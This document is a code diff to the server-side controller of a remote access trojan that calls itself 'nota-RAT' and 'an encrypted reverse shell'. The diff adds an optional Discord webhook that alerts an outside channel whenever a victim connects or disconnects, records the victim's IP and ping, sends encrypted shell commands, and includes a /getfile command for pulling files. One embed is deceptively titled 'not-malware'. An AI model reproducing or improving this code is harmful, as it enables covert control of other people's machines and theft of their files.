@@ -12,7 +12,11 @@ parser = argparse.ArgumentParser(
 )
 
 parser.add_argument(
-    "-p", "--port", default=423, help="Port of the Server", type=int
+    "-p", "--port", default=421, help="Port of the Server", type=int
+)
+
+parser.add_argument(
+    "-d", "--discord", help="Discord webhook for new connections", type=str
 )
 
 
@@ -46,15 +50,26 @@ client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
 
-response_list = ping(f'{client_address[0]}', size=40, count=10)
-webhook = DiscordWebhook(url='discord web token', content='@everyone')
-embed = DiscordEmbed(title='nota-RAT', description='an encrypted reverse shell', color='03b2f8')
-embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
-embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
-embed.add_embed_field(name='Ping', value=f'{response_list.rtt_avg_ms}')
-embed.set_timestamp()
-webhook.add_embed(embed)
-webhook.execute()
+if args.discord:
+    ping_command = f"ping {client_address[0]}"
+
+    if platform == 'win32':
+        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}"], capture_output = True).stdout.decode()
+        ping = re.search("Average = (.*)", pings_command)
+    else: 
+        pings_command = subprocess.run(["ping", f"{client_socket.getpeername()[0]}", "-c", "4"], capture_output = True).stdout.decode()
+        ping = re.split("/", pings_command)
+    ping = ping[-1].replace("\n", "")
+
+
+    webhook = DiscordWebhook(url=args.discord, content='@everyone')
+    embed = DiscordEmbed(title='not-malware', description='An encrypted reverse shell', color='03b2f8')
+    embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
+    embed.add_embed_field(name='Connection', value=f'{client_address[0]}')
+    embed.add_embed_field(name='Ping', value=f'{ping}')
+    embed.set_timestamp()
+    webhook.add_embed(embed)
+    webhook.execute()
 
 
 cwd = client_socket.recv(BUFFER_SIZE)
@@ -68,13 +83,16 @@ while True:
     commandz = Fernet(key).encrypt(command.encode())
     client_socket.send(commandz)
     if command.lower() == "exit":
-        webhook = DiscordWebhook(url='discord web token', content='@everyone')
-        embed = DiscordEmbed(title='nota-RAT', description='an encrypted reverse shell', color='03b2f8')
-        embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
-        embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
-        embed.set_timestamp()
-        webhook.add_embed(embed)
-        webhook.execute()
+        if args.discord:
+            webhook = DiscordWebhook(url=args.discord, content='@everyone')
+            embed = DiscordEmbed(title='nota-RAT', description='An encrypted reverse shell', color='03b2f8')
+            embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
+            embed.add_embed_field(name='Disconnection', value=f'{client_address[0]}')
+            embed.set_timestamp()
+            webhook.add_embed(embed)
+            webhook.execute()
+        client_socket.close()
+        s.close()
         break
     if command == "/getfile":
         filename = input("Please enter the filename: ")
